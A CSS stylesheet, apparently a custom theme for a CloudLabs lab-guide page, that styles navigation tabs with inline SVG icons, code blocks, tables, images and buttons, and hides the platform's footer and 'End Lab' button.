  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='15' viewBox='0 0 512 512' data-slot='icon'%3E%3Cpath fill='%230254ec' d='M64 80c-8.8 0-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16l384 0c8.8 0 16-7.2 16-16l0-64c0-8.8-7.2-16-16-16L64 80zM0 96C0 60.7 28.7 32 64 32l384 0c35.3 0 64 28.7 64 64l0 64c0 35.3-28.7 64-64 64L64 224c-35.3 0-64-28.7-64-64L0 96zM64 336c-8.8 0-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16l384 0c8.8 0 16-7.2 16-16l0-64c0-8.8-7.2-16-16-16L64 336zM0 352c0-35.3 28.7-64 64-64l384 0c35.3 0 64 28.7 64 64l0 64c0 35.3-28.7 64-64 64L64 480c-35.3 0-64-28.7-64-64l0-64zm392 32a24 24 0 1 1 48 0 24 24 0 1 1 -48 0zm24-280a24 24 0 1 1 0 48 24 24 0 1 1 0-48zM328 384a24 24 0 1 1 48 0 24 24 0 1 1 -48 0zm24-280a24 24 0 1 1 0 48 24 24 0 1 1 0-48z'%3E%3C/path%3E%3C/svg%3E") !important;
}
.tab-wrpguide ul.nav-tabs li a:hover[aria-label="LAB PROGRESS"] {
  background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" height="15" viewBox="0 0 512 512"><!--!Font Awesome Pro 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2025 Fonticons, Inc.--><path fill="%230254ec" d="M256 48a208 208 0 1 1 0 416 208 208 0 1 1 0-416zm0 464A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm56-160c0-14-5.1-26.8-13.7-36.6L366 161.7c5.3-12.1-.2-26.3-12.3-31.6s-26.3 .2-31.6 12.3L254.4 296c-30.2 .8-54.4 25.6-54.4 56c0 30.9 25.1 56 56 56s56-25.1 56-56z"/></svg>') !important;
}
.tab-wrpguide ul.nav-tabs li a:focus {
    outline: none;
}
/* active tab coloring */
.tab-wrpguide ul li a.active-tab {
    background-color: #eaf1ff;
    border: 1px solid #0254EC !important;
}
.tab-wrpguide ul li a.active-tab[aria-label="LAB DESCRIPTION"] {
  background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" height="15" viewBox="0 0 448 512"><!--!Font Awesome Pro 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2025 Fonticons, Inc.--><path fill="%230254ec" d="M176 196.8c0 20.7-5.8 41-16.6 58.7L119.7 320l208.6 0-39.7-64.5c-10.9-17.7-16.6-38-16.6-58.7L272 48l-96 0 0 148.8zM320 48l0 148.8c0 11.8 3.3 23.5 9.5 33.5L437.7 406.2c6.7 10.9 10.3 23.5 10.3 36.4c0 38.3-31.1 69.4-69.4 69.4L69.4 512C31.1 512 0 480.9 0 442.6c0-12.8 3.6-25.4 10.3-36.4L118.5 230.4c6.2-10.1 9.5-21.7 9.5-33.5L128 48l-8 0c-13.3 0-24-10.7-24-24s10.7-24 24-24l40 0L288 0l40 0c13.3 0 24 10.7 24 24s-10.7 24-24 24l-8 0z"/></svg>') !important;
}
.tab-wrpguide ul li a.active-tab[aria-label="LAB GUIDE DETAILS"] {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='15' viewBox='0 0 576 512'%3E%3C!--!Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2025 Fonticons, Inc.--%3E%3Cpath fill='%230254ec' d='M565.6 36.2C572.1 40.7 576 48.1 576 56l0 336c0 10-6.2 18.9-15.5 22.4l-168 64c-5.2 2-10.9 2.1-16.1 .3L192.5 417.5l-160 61c-7.4 2.8-15.7 1.8-22.2-2.7S0 463.9 0 456L0 120c0-10 6.1-18.9 15.5-22.4l168-64c5.2-2 10.9-2.1 16.1-.3L383.5 94.5l160-61c7.4-2.8 15.7-1.8 22.2 2.7zM48 136.5l0 284.6 120-45.7 0-284.6L48 136.5zM360 422.7l0-285.4-144-48 0 285.4 144 48zm48-1.5l120-45.7 0-284.6L408 136.5l0 284.6z'/%3E%3C/svg%3E") !important;
}
.tab-wrpguide ul li a.active-tab[aria-label="ENVIRONMENT DETAILS"] {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='15' viewBox='0 0 640 512'%3E%3Cpath fill='%230254ec' d='M410.8 134.2c-19.3 8.6-42 3.5-55.9-12.5C332.8 96.1 300.3 80 264 80c-66.3 0-120 53.7-120 120c0 0 0 0 0 0s0 0 0 0l0 .2c0 20.4-12.8 38.5-32 45.3C74.6 258.7 48 294.3 48 336c0 53 43 96 96 96l360 0 3.3 0c.6-.1 1.3-.1 1.9-.2c46.2-2.7 82.8-41 82.8-87.8c0-36-21.6-67.1-52.8-80.7c-20.1-8.8-31.6-30-28.1-51.7c.6-3.8 .9-7.7 .9-11.7c0-39.8-32.2-72-72-72c-10.5 0-20.4 2.2-29.2 6.2zM512 479.8l0 .2-8 0-40 0-320 0C64.5 480 0 415.5 0 336c0-62.7 40.1-116 96-135.8l0-.2c0-92.8 75.2-168 168-168c50.9 0 96.4 22.6 127.3 58.3C406.2 83.7 422.6 80 440 80c66.3 0 120 53.7 120 120c0 6.6-.5 13-1.5 19.3c48 21 81.5 68.9 81.5 124.7c0 72.4-56.6 131.6-128 135.8z'%3E%3C/path%3E%3C/svg%3E") !important;
}
.tab-wrpguide ul li a.active-tab[aria-label="RESOURCES"] {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='15' viewBox='0 0 512 512' data-slot='icon'%3E%3Cpath fill='%230254ec' d='M64 80c-8.8 0-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16l384 0c8.8 0 16-7.2 16-16l0-64c0-8.8-7.2-16-16-16L64 80zM0 96C0 60.7 28.7 32 64 32l384 0c35.3 0 64 28.7 64 64l0 64c0 35.3-28.7 64-64 64L64 224c-35.3 0-64-28.7-64-64L0 96zM64 336c-8.8 0-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16l384 0c8.8 0 16-7.2 16-16l0-64c0-8.8-7.2-16-16-16L64 336zM0 352c0-35.3 28.7-64 64-64l384 0c35.3 0 64 28.7 64 64l0 64c0 35.3-28.7 64-64 64L64 480c-35.3 0-64-28.7-64-64l0-64zm392 32a24 24 0 1 1 48 0 24 24 0 1 1 -48 0zm24-280a24 24 0 1 1 0 48 24 24 0 1 1 0-48zM328 384a24 24 0 1 1 48 0 24 24 0 1 1 -48 0zm24-280a24 24 0 1 1 0 48 24 24 0 1 1 0-48z'%3E%3C/path%3E%3C/svg%3E") !important;
}
.tab-wrpguide ul li a.active-tab[aria-label="LAB PROGRESS"] {
  background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" height="15" viewBox="0 0 512 512"><!--!Font Awesome Pro 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2025 Fonticons, Inc.--><path fill="%230254ec" d="M256 48a208 208 0 1 1 0 416 208 208 0 1 1 0-416zm0 464A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm56-160c0-14-5.1-26.8-13.7-36.6L366 161.7c5.3-12.1-.2-26.3-12.3-31.6s-26.3 .2-31.6 12.3L254.4 296c-30.2 .8-54.4 25.6-54.4 56c0 30.9 25.1 56 56 56s56-25.1 56-56z"/></svg>') !important;
}
body.theme-blue .tab-wrpguide ul li a.active-tab {
    color: #0254EC !important;
}
.tab-wrpguide ul.nav-tabs li:first-child a {
    border-top-left-radius: 9999px;
    border-bottom-left-radius: 9999px;
    border-left: 1px solid #71778350;
}
.tab-wrpguide ul.nav-tabs li:nth-last-child(2) a {
    border-top-right-radius: 9999px;
    border-bottom-right-radius: 9999px;
}
.tab-wrpguide ul.nav-tabs li:last-child a {
    border-top-right-radius: 9999px;
    border-bottom-right-radius: 9999px;
}
.tab-wrpguide ul.nav-tabs li a b {
    font-weight: 500;
}
.tab-wrpguide .nav-tabs {
    border-bottom: 0;
    padding-top: 10px !important;
    padding-left: 35px !important;
    width: fit-content;
    min-width: 850px;
    margin-left:auto;
    margin-right:auto;
    justify-content: center;
}
.tab-wrpguide ul.nav-tabs li:after {
    width: 0;
}
/* add icons to top navigation buttons */
.tab-wrpguide ul.nav-tabs li a[aria-label="LAB DESCRIPTION"] {
  background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" height="15" viewBox="0 0 448 512"><!--!Font Awesome Pro 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2025 Fonticons, Inc.--><path fill="%2301123F" d="M176 196.8c0 20.7-5.8 41-16.6 58.7L119.7 320l208.6 0-39.7-64.5c-10.9-17.7-16.6-38-16.6-58.7L272 48l-96 0 0 148.8zM320 48l0 148.8c0 11.8 3.3 23.5 9.5 33.5L437.7 406.2c6.7 10.9 10.3 23.5 10.3 36.4c0 38.3-31.1 69.4-69.4 69.4L69.4 512C31.1 512 0 480.9 0 442.6c0-12.8 3.6-25.4 10.3-36.4L118.5 230.4c6.2-10.1 9.5-21.7 9.5-33.5L128 48l-8 0c-13.3 0-24-10.7-24-24s10.7-24 24-24l40 0L288 0l40 0c13.3 0 24 10.7 24 24s-10.7 24-24 24l-8 0z"/></svg>');
  background-repeat: no-repeat;
  background-position-y: center;
  background-position-x: 13px;
  padding-left: 32px;
}
.tab-wrpguide ul.nav-tabs li a[aria-label="LAB GUIDE DETAILS"] {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='15' viewBox='0 0 576 512'%3E%3C!--!Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2025 Fonticons, Inc.--%3E%3Cpath fill='%2301123F' d='M565.6 36.2C572.1 40.7 576 48.1 576 56l0 336c0 10-6.2 18.9-15.5 22.4l-168 64c-5.2 2-10.9 2.1-16.1 .3L192.5 417.5l-160 61c-7.4 2.8-15.7 1.8-22.2-2.7S0 463.9 0 456L0 120c0-10 6.1-18.9 15.5-22.4l168-64c5.2-2 10.9-2.1 16.1-.3L383.5 94.5l160-61c7.4-2.8 15.7-1.8 22.2 2.7zM48 136.5l0 284.6 120-45.7 0-284.6L48 136.5zM360 422.7l0-285.4-144-48 0 285.4 144 48zm48-1.5l120-45.7 0-284.6L408 136.5l0 284.6z'/%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position-y: center;
  background-position-x: 8px;
  padding-left: 31px;
}
.tab-wrpguide ul.nav-tabs li a[aria-label="ENVIRONMENT DETAILS"] {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='15' viewBox='0 0 640 512'%3E%3Cpath fill='%2301123F' d='M410.8 134.2c-19.3 8.6-42 3.5-55.9-12.5C332.8 96.1 300.3 80 264 80c-66.3 0-120 53.7-120 120c0 0 0 0 0 0s0 0 0 0l0 .2c0 20.4-12.8 38.5-32 45.3C74.6 258.7 48 294.3 48 336c0 53 43 96 96 96l360 0 3.3 0c.6-.1 1.3-.1 1.9-.2c46.2-2.7 82.8-41 82.8-87.8c0-36-21.6-67.1-52.8-80.7c-20.1-8.8-31.6-30-28.1-51.7c.6-3.8 .9-7.7 .9-11.7c0-39.8-32.2-72-72-72c-10.5 0-20.4 2.2-29.2 6.2zM512 479.8l0 .2-8 0-40 0-320 0C64.5 480 0 415.5 0 336c0-62.7 40.1-116 96-135.8l0-.2c0-92.8 75.2-168 168-168c50.9 0 96.4 22.6 127.3 58.3C406.2 83.7 422.6 80 440 80c66.3 0 120 53.7 120 120c0 6.6-.5 13-1.5 19.3c48 21 81.5 68.9 81.5 124.7c0 72.4-56.6 131.6-128 135.8z'%3E%3C/path%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position-y: center;
  background-position-x: 8px;
  padding-left: 33px;
}
.tab-wrpguide ul.nav-tabs li a[aria-label="RESOURCES"] {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='15' viewBox='0 0 512 512' data-slot='icon'%3E%3Cpath fill='%2301123F' d='M64 80c-8.8 0-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16l384 0c8.8 0 16-7.2 16-16l0-64c0-8.8-7.2-16-16-16L64 80zM0 96C0 60.7 28.7 32 64 32l384 0c35.3 0 64 28.7 64 64l0 64c0 35.3-28.7 64-64 64L64 224c-35.3 0-64-28.7-64-64L0 96zM64 336c-8.8 0-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16l384 0c8.8 0 16-7.2 16-16l0-64c0-8.8-7.2-16-16-16L64 336zM0 352c0-35.3 28.7-64 64-64l384 0c35.3 0 64 28.7 64 64l0 64c0 35.3-28.7 64-64 64L64 480c-35.3 0-64-28.7-64-64l0-64zm392 32a24 24 0 1 1 48 0 24 24 0 1 1 -48 0zm24-280a24 24 0 1 1 0 48 24 24 0 1 1 0-48zM328 384a24 24 0 1 1 48 0 24 24 0 1 1 -48 0zm24-280a24 24 0 1 1 0 48 24 24 0 1 1 0-48z'%3E%3C/path%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position-y: center;
  background-position-x: 8px;
  padding-left: 30px;
}
.tab-wrpguide ul.nav-tabs li a[aria-label="LAB PROGRESS"] {
  background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" height="15" viewBox="0 0 512 512"><!--!Font Awesome Pro 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2025 Fonticons, Inc.--><path fill="%2301123F" d="M256 48a208 208 0 1 1 0 416 208 208 0 1 1 0-416zm0 464A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm56-160c0-14-5.1-26.8-13.7-36.6L366 161.7c5.3-12.1-.2-26.3-12.3-31.6s-26.3 .2-31.6 12.3L254.4 296c-30.2 .8-54.4 25.6-54.4 56c0 30.9 25.1 56 56 56s56-25.1 56-56z"/></svg>');
  background-repeat: no-repeat;
  background-position-y: center;
  background-position-x: 8px;
  padding-left: 30px;
}
/* override specific aspects of the body style */
body.theme-blue {
    font-family: "DM Sans", sans-serif !important;
    background-color: #eaf1ff20 !important;
}
body.theme-blue a:hover {
    outline: none !important;
}
body.theme-blue a:focus {
    outline: none !important;
}
body.theme-blue cloudlabs-pagination-controls ul.ngx-pagination li.current {
    background: #0254ec !important;
}
.navbar.navbar-expand-lg.py-0.headerBg {
    background-color: #0254ec;
}
/* remove footer */
.row {
    --footer-height: 0px;
}
/* sizing the div container that contains the lab guide content and centering it */
#lab-guide-content {
    margin: auto;
    width: 100%;
    max-width: fit-content;
    min-width: 850px;
}
#lab-guide-content .content-wrp {
    margin-top: 0 !important;
}
/* remove the CloudLabs footer */
.appfooter{
    max-height:0px;
    display: none;
}
/* div inside of the lab-guide-content div. setting various font and spacing aspects.*/
#guide-page,
#guide-page-,
#guideView{
    font-optical-sizing: auto;
    font-size: 16px;
    font-weight: 400;
    font-style: normal;
    max-width: 1200px;
    color: #01123F;
    margin: 50px 24px;
    letter-spacing: 0px;
}
/* text links */
#guide-page a,
#guide-page- a,
#guideView a{
    color: #003AA4;
    background-color: transparent;
    cursor: pointer;
    outline: none;
    text-decoration: none;
    text-underline-offset: 4px;
    text-decoration-thickness: 1px;
}
#guide-page a::after,
#guide-page- a::after,
#guideView a::after{
    font-family: 'FontAwesome';
    content: '\f08e';
    font-weight: 900;
    margin: 0px 5px;
}
#guide-page a:hover,
#guide-page- a:hover,
#guideView a:hover{
    text-decoration: underline;
    text-underline-offset: 4px;
    text-decoration-thickness: 1px;
}
#guide-page a:focus,
#guide-page- a:focus,
#guideView a:focus{
    outline: none;
    opacity: 0.9;
}
/* underline */
#guide-page u,
#guide-page- u,
#guideView u{
    text-underline-offset: 4px;
    text-decoration-thickness: 1px;
}
/* strong font weight */
#guide-page strong,
#guide-page- strong,
#guideView strong{
    font-weight: 600;
}
/* images */
#guide-page img,
#guide-page- img,
#guideView img{
    margin: 20px 0px;
    width: 60%;
    max-width: 650px;
    box-shadow: 4px 4px 20px #71778350;
    border-radius: 10px;
}
/* regular (not copyable/injects) inline code/highlight */
#guide-page code,
#guide-page- code,
#guideView code{
    color: #01123F;
    background-color: #F3F8FF;
    border: 1px solid #B8D3FF;
    padding: 3px;
    border-radius: 4px;
    white-space: nowrap;
}
/* code blocks */
#guide-page pre code,
#guide-page- pre code,
#guideView pre code{
    color: #F9FCFF;
    border: none;
    background: none;
    display: block;
    font-family: ui-monospace, monospace;
    font-size: 15px;
    white-space: pre-wrap;
}
#guide-page .variable-binding pre,
#guide-page- .variable-binding pre,
#guideView .variable-binding pre{
    background: #101827;
    margin-top: -6px;
    border-radius: 8px;
    white-space: pre-wrap;
}
/* sample output code blocks */
#guide-page samp,
#guide-page- samp,
#guideView samp{
    color: #F9FCFF;
    background: #101827;
    margin-top: -6px;
    border-radius: 8px;
    display: block;
    font-family: ui-monospace, monospace;
    padding: 15px;
    width: 95%;
}
/* copyable inline code/highlight (injects) */
#guide-page .copydetails span,
#guide-page- .copydetails span,
#guideView .copydetails span{
    color: #0254EC;
    background-color: #DFEAFF;
    border: 1px solid #6195FF;
    border-radius: 5px;
    display: inline;
    white-space: nowrap;
    padding: 3px;
}
/* copy button after inline copyable code (injects) */
#guide-page .variable-binding span.copydetails a:before,
#guide-page- .variable-binding span.copydetails a:before,
#guideView .variable-binding span.copydetails a:before{
    color: #6195FF;
    display: inline-block;
    vertical-align: text-bottom;
    height: 17px;
    line-height: 17px;
}
/* not copyable inline code/highlight (injects) */
#guide-page .variable-binding span.copydetails.hide-copy-btn span,
#guide-page- .variable-binding span.copydetails.hide-copy-btn span,
#guideView .variable-binding span.copydetails.hide-copy-btn span{
    color: #01123f;
    background-color: transparent;
    border: none;
}
/* inline copyable text (injects) size */
.variable-binding span.copydetails span{
    font-size: 16px;
}
/* various list spacings */
#guide-page li > p + ol,
#guide-page- li > p + ol,
#guideView li > p + ol{
    margin-top: 3px;
    margin-bottom: 6px;
}
#guide-page p + ol,
#guide-page- p + ol,
#guideView p + ol{
    margin-top: -6px;
}
#guide-page ol > li > p,
#guide-page- ol > li > p,
#guideView ol > li > p{
    line-height: 1.6;
}
#guide-page ol,
#guide-page- ol,
#guideView ol{
    line-height: 1.6;
}
#guide-page ul,
#guide-page- ul,
#guideView ul{
    margin-bottom: 10px;
}
#guide-page li,
#guide-page- li,
#guideView li{
    margin-bottom: 10px;
}
/* h1 headings */
#guide-page h1,
#guide-page- h1,
#guideView h1{
    font-size: 32px;
    margin-bottom: 16px;
    color: #01123F;
}
/* h2 headings */
#guide-page h2,
#guide-page- h2,
#guideView h2{
    font-size: 24px;
    margin-bottom: 24px;
    color: #01123F;
}
/* h3 headings */
#guide-page h3,
#guide-page- h3,
#guideView h3{
    font-size: 20px;
    margin-top: 12px;
    margin-bottom: 12px;
    color: #01123F;
}
/* h4 headings */
#guide-page h4,
#guide-page- h4,
#guideView h4{
    font-size: 18px;
    margin-top: 12px;
    margin-bottom: 12px;
    color: #01123F;
}
/* collapsible section header text */
details > summary{
    list-style-image: url('data:image/svg+xml,<svg viewBox="0 0 256.04999 448.14999" xmlns="http://www.w3.org/2000/svg"><!--!Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2025 Fonticons, Inc.--><path d="m 246.675,201.475 c 12.5,12.5 12.5,32.8 0,45.3 l -192,192 c -12.5,12.5 -32.8,12.5 -45.3,0 -12.5,-12.5 -12.5,-32.8 0,-45.3 l 169.4,-169.4 -169.3,-169.4 c -12.5,-12.5 -12.5,-32.8 0,-45.3 12.5,-12.5 32.8,-12.5 45.3,0 l 192,192 z" id="path1" /></svg>');
    font-weight: 600;
    font-size: 16px;
    padding: 5px 0px 5px 0px;
}
details > summary::marker{
    font-size: 25px;
    line-height: 0.1;
}
/* text inside of a collapsible section */
details {
    border: 1px solid #71778350;
    border-radius: 8px;
    padding:5px 15px;
    width: auto;
}
/* spacing at bottom of collapsible section */
details[open] > summary {
    list-style-image: url('data:image/svg+xml,<svg viewBox="0 0 448.14999 256.04999" xmlns="http://www.w3.org/2000/svg"><!--!Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2025 Fonticons, Inc.--><path d="m 201.475,246.675 c 12.5,12.5 32.8,12.5 45.3,0 l 192,-192 c 12.5,-12.5 12.5,-32.8 0,-45.3 -12.5,-12.5 -32.8,-12.5 -45.3,0 l -169.4,169.4 -169.4,-169.3 c -12.5,-12.5 -32.8,-12.5 -45.3,0 -12.5,12.5 -12.5,32.8 0,45.3 l 192,192 z" id="path1" /></svg>');
    margin-bottom: 5px;
}
/* remove CloudLabs button */
teams-button[aria-label="change vm 100% selected"] {
    display: none;
}
/* special sizing and placement for images that float to the left of the page. use ^< at the end of the alt text to apply this style. */
#guide-page img[alt$="^<"],
#guide-page- img[alt$="^<"],
#guideView img[alt$="^<"]{
    width: 300px;
    height: auto;
    float: left;
    margin-left: 100px;
    margin-right: 100px;
    border: none;
    box-shadow: none;
}
/* special sizing and placement for images that float to the right of the page. use ^> at the end of the alt text to apply this style. */
#guide-page img[alt$="^>"],
#guide-page- img[alt$="^>"],
#guideView img[alt$="^>"]{
    width: 300px;
    height: auto;
    float: right;
    margin-left: 100px;
    margin-right: 100px;
    border: none;
    box-shadow: none;
}
/* smaller sizing for images that are taller than they are wide, causing them to look too large. use < at the end of the alt text to apply this style. */
#guide-page img[alt$="<"],
#guide-page- img[alt$="<"],
#guideView img[alt$="<"]{
    width: 250px;
}
/* smaller sizing for special images such as those placed in a table or in-line with text. use << at the end of the alt text to apply this style. */
#guide-page img[alt$="<<"],
#guide-page- img[alt$="<<"],
#guideView img[alt$="<<"]{
    max-height: 50px;
    border: none;
    margin-bottom: 5px;
    width: 100%;
    max-width: 50px;
    border-radius: none;
}
/* special sizing and styling for banner images at the top of the lab guide. use <> at the end of the alt text to apply this style. */
#guide-page img[alt$="<>"],
#guide-page- img[alt$="<>"],
#guideView img[alt$="<>"]{
    margin-bottom: 35px;
    width: 100%;
    max-width: 100%;
    border-radius: 10px;
}
/* special sizing and styling for the progress map image at the top-right of the lab guide. use "Lab progress map" as the alt text to apply this style. */
#guide-page img[alt$="Lab progress map"],
#guide-page- img[alt$="Lab progress map"],
#guideView img[alt$="Lab progress map"]{
    width: 100%;
    height: auto;
    max-width: 100%;
    border: none;
    box-shadow: none;
    border-radius: 10px;
    margin: 5px auto;
}
/* special sizing and styling for the progress map image on the lab introduction page. use "Lab progress map (center)" as the alt text to apply this style. */
#guide-page img[alt="Lab progress map (center)"],
#guide-page- img[alt="Lab progress map (center)"],
#guideView img[alt="Lab progress map (center)"]{
    border: none;
    margin-top: 10px;
    margin-bottom: 10px;
    width: 60%;
    height: auto;
    max-width: 60%;
    margin-left: auto;
    margin-right: auto;
    box-shadow: none;
    display: block;
}
/* special sizing and styling for the centering an image with a larger size. use "(center)" at the end of the alt text to apply this style. */
#guide-page img[alt$="(center)"],
#guide-page- img[alt$="(center)"],
#guideView img[alt$="(center)"]{
    width: 60%;
    height: auto;
    max-width: 60%;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
/* tables and their various elements */
#guide-page table,
#guide-page- table,
#guideView table {
    border: 1px solid #71778350;
    border-radius: 7px;
    width: fit-content;
    max-width: 100%;
    color: #01123F;
}
markdown table tbody tr:nth-of-type(odd) {
    background-color: transparent;
}
#guide-page th,
#guide-page- th,
#guideView th {
    background-color: #E0E7F1;
    border-top: none;
    border-bottom: none;
    border-left: 1px solid #71778350;
}
#guide-page th:first-child,
#guide-page- th:first-child,
#guideView th:first-child {
    border-left: none;
}
#guide-page td,
#guide-page- td,
#guideView td {
    border-top: 1px solid #71778350;
    border-left: 1px solid #71778350;
}
#guide-page td:first-child,
#guide-page- td:first-child,
#guideView td:first-child {
    border-left: none;
}
#guide-page tr:hover,
#guide-page- tr:hover,
#guideView tr:hover {
    background-color: #E0E7F1;
}
/* horizontal lines/dividers */
hr {
    margin-top: 30px !important;
    margin-bottom: 30px !important;
    border: 0 !important;
    border-top: 0 !important;
    background-image: linear-gradient(to right, #0254ec80, #ffbfd680);
    height: 1px !important;
}
/* tables on the "Environment" and "Resources" tabs. */
#lab-environment-tab .table,
#resource-container .table {
    border: 1px solid #71778350;
    border-radius: 7px;
    width: 100%;
    border-spacing: 0;
    border-collapse: separate;
    background-color: transparent !important;
    margin-top: 30px;
    color: #01123F;
}
#lab-environment-tab .table {
    margin-top: 30px;
}
#resource-container .table {
    margin-top: 15px;
}
#lab-environment-tab .table thead th,
#resource-container .table thead th {
    border-bottom: 0;
}
#lab-environment-tab .table th,
#resource-container .table th {
    background-color: #E0E7F1;
    border-top: none;
    border-bottom: none;
    border-left: 1px solid #71778350;
    padding: 10px;
}
#lab-environment-tab .table th:first-child,
#resource-container .table th:first-child {
    border-left: none;
    border-top-left-radius: 7px;
}
#lab-environment-tab .table th:last-child,
#resource-container .table th:last-child {
    border-top-right-radius: 7px;
}
#lab-environment-tab .table td,
#resource-container .table td {
    border-top: 1px solid #71778350;
    border-left: 1px solid #71778350;
    background-color: transparent !important;
    padding: 10px;
}
#lab-environment-tab .table td:first-child,
#resource-container .table td:first-child {
    border-left: none;
}
#lab-environment-tab .table tr:hover,
#resource-container .table tr:hover {
    background-color: #E0E7F1;
}
#lab-environment-tab .table tr:last-child td:first-child,
#resource-container .table tr:last-child td:first-child {
    border-bottom-left-radius: 7px;
}
#lab-environment-tab .table tr:last-child td:last-child,
#resource-container .table tr:last-child td:last-child {
    border-bottom-right-radius: 7px;
}
#lab-environment-tab .form-control,
#resource-container .form-control {
    color: #01123F;
}
#lab-environment-tab i,
#resource-container i {
    color: #01123F;
}
/* sections on the "Resources" tab */
#resource-container .square-box {
  border: 0 !important;
}
#resource-container .heading-outer {
  border: 0 !important;
  align-items: center;
}
#resource-container .heading-box {
  background-color: #173AAA !important;
  color: #ffffff;
  border-radius: 7px;
  border-bottom: 0 !important;
}
/* refresh button on the "Resources" tab */
#refresh-all-btn {
    border-radius: 9999px;
    background-color: #fdfdff !important;
    color: #01123f !important;
    padding: 7px 25px 5px;
    border: 1px solid #71778350;
    font-size: 14px;
    font-weight: 500;
}
#refresh-all-btn:hover {
    border-color: #0254EC;
    color: #0254EC !important;
    background-color: #eaf1ff !important;
    outline: none;
}
#refresh-all-btn:focus {
    outline: none !important;
    box-shadow: none !important;
}
#refresh-all-btn:active {
    border: 1px solid #0254ec !important;
    outline: none !important;
    box-shadow: none !important;
}
/* "Scroll to top" button */
.vm-lab-guide .scrollTop {
    position: fixed;
    right: 30px;
    bottom: 75px;
    font-size: 28px;
    padding: 0px 10px 2px;
    font-weight: 700;
    line-height: 0;
    border: 1px solid #71778350;
    box-shadow: none;
    z-index: 99999;
    background-color: #fdfdff;
    border-radius: 10px;
}
button.scrollTop i {
    color: #01123f;
}
button.scrollTop:hover i {
    color: #0254ec;
}
button.scrollTop:focus i {
    color: #0254ec;
}
button.scrollTop:active i {
    color: #0254ec;
}
.vm-lab-guide .scrollTop:hover {
    border-color: #0254ec;
    color: #0254ec;
    background-color: #eaf1ff;
}
.vm-lab-guide .scrollTop:focus {
    outline: none !important;
    border: 1px solid #0254ec !important;
    background-color: #eaf1ff;
}
.vm-lab-guide .scrollTop:active {
    outline: none !important;
    border: 1px solid #0254ec !important;
    background-color: #eaf1ff;
}
/* scrollbar */
#lab-guideview {
    scrollbar-color: #babbc6 transparent;
}
::-webkit-scrollbar {
    width: 14px;
    height: 14px;
}
::-webkit-scrollbar-corner {
    background-color: transparent;
}
::-webkit-scrollbar-thumb {
    border: 4px solid transparent;
    background-clip: padding-box;
    border-radius: 9999px;
    background-color: #babbc6;
    z-index: 999;
}
/* Image pop-up buttons */
body.theme-blue .ts-btn-fluent-primary {
    border-radius: 9999px;
    background-color: #fdfdff !important;
    color: #01123f !important;
    padding: 7px 25px 5px;
    border: 1px solid #71778350;
    font-size: 14px;
    font-weight: 500;
}
body.theme-blue .ts-btn-fluent-primary i {
    color: #01123f !important;
}
body.theme-blue .ts-btn-fluent-primary:hover {
    border-color: #0254EC;
    color: #0254EC !important;
    background-color: #eaf1ff !important;
    outline: none;
    border: 1px solid;
}
body.theme-blue .ts-btn-fluent-primary:hover i {
    color: #0254EC !important;
}
/* Styling to create a special header at the top of the page. Use a regular paragraph before the H1 header to apply it. */
p:has(+ h1) {
  color: #0254ec;
  text-transform: uppercase;
  margin-bottom: 5px;
  font-weight: 600;
}
.lab-header {
  height: fit-content;
  width: 100%;
  padding: 0;
  margin-bottom: 30px;
  display: flex;
  gap: 40px;
}
/* special sizing and placement for images that are used in the header. use + at the end of the alt text to apply this style. */
#guide-page img[alt$="+"],
#guide-page- img[alt$="+"],
#guideView img[alt$="+"]{
    width: auto;
    height: 300px;
    margin-left: 50px;
    margin-right: 30px;
    margin-top: 0;
    border: none;
    box-shadow: none;
    border-radius: 10px;
    position: absolute;
    left: 60%;
    top: 0;
}
/* Remove "End Lab" section at the end of the final lab guide page that is auto-added by CloudLabs */
cloudlabs-delete-button {
    display: none;
}
.btn-danger, .modal-close-button {
    color: #fff;
    background-color: #c60000;
    border-color: #c60000;
    border-radius: 9999px !important;
    font-size: 14px !important;
    padding: 7px 25px 5px !important;
}
.p-dialog .p-dialog-header .p-dialog-header-icon {
    border-radius: 9999px;
}
.dropdown-item:hover, .dropdown-item:focus {
    font-family: "DM Sans", sans-serif !important;
    color: #0254EC !important;
    background-color: #eaf1ff !important;
    border-radius: 9999px;
}

</style>
